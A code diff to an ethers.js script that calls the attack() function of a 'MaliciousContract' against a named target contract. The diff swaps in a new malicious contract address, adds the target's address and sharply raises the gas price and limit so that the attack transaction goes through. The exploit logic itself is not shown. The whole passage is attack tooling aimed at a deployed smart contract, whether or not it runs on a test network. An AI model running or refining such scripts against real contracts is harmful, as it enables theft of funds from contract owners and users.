@@ -7,7 +7,9 @@ async function main() {
 
     console.log("Configured attacker address:", attacker.address);
 
-    const maliciousContractAddress = "0x5456070082e58Fa63F0aDacB5f4527da25BD7454";
+    const maliciousContractAddress = "0xFfde19E32cC0B94Eb1208C40ABA992a3eB501ba8"; // Updated address of the MaliciousContract
+    const targetContractAddress = "0x5456070082e58Fa63F0aDacB5f4527da25BD7454"; // Address of the contract being attacked
+
     const MaliciousContract = new ethers.Contract(
         maliciousContractAddress,
         [
@@ -18,16 +20,18 @@ async function main() {
         attacker
     );
 
+    console.log("Attempting to execute attack on target contract:", targetContractAddress);
+
     try {
         console.log("Attempting to execute attack...");
 
-        // Set gas price according to balance
-        const gasPrice = ethers.utils.parseUnits('100', 'gwei'); // Adjusted to maximum affordable price
+        // Set a very high gas price
+        const gasPrice = ethers.utils.parseUnits('1000', 'gwei'); // Set maximum desired gas price
 
-        // Call the attack function with a reasonable gas limit
+        // Call the attack function with an increased gas limit and high gas price
         const tx = await MaliciousContract.attack({
-            gasLimit: 100000,  // Adjust gas limit based on expected usage
-            gasPrice: gasPrice  // Set high gas price
+            gasLimit: 5000000,  // Adjust gas limit as necessary
+            gasPrice: gasPrice    // Set high gas price
         });
 
         const receipt = await tx.wait();
